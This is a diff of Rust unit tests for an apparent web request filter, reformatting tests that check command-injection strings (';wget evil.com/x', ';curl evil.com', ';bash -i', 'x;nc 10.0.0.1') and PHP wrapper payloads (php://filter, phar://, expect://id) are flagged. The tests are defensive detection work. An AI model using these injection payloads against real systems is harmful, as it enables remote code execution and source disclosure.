@@ -238,7 +238,12 @@ mod tests {
     #[test]
     fn flags_bare_command_injection_in_query() {
         // The documented `;wget` gap (round-2 benchmark robustness probe).
-        for payload in [";wget evil.com/x", ";curl evil.com", ";bash -i", "x;nc 10.0.0.1"] {
+        for payload in [
+            ";wget evil.com/x",
+            ";curl evil.com",
+            ";bash -i",
+            "x;nc 10.0.0.1",
+        ] {
             let rules = rules_for_query_value(payload);
             assert!(
                 rules.contains(&"rce_cmd"),
@@ -266,8 +271,10 @@ mod tests {
 
     #[test]
     fn flags_php_wrappers() {
-        assert!(rules_for_query_value("php://filter/convert.base64-encode/resource=index")
-            .contains(&"php_wrapper"));
+        assert!(
+            rules_for_query_value("php://filter/convert.base64-encode/resource=index")
+                .contains(&"php_wrapper")
+        );
         assert!(rules_for_query_value("phar://malicious.phar/x").contains(&"php_wrapper"));
         assert!(rules_for_query_value("expect://id").contains(&"php_wrapper"));
     }
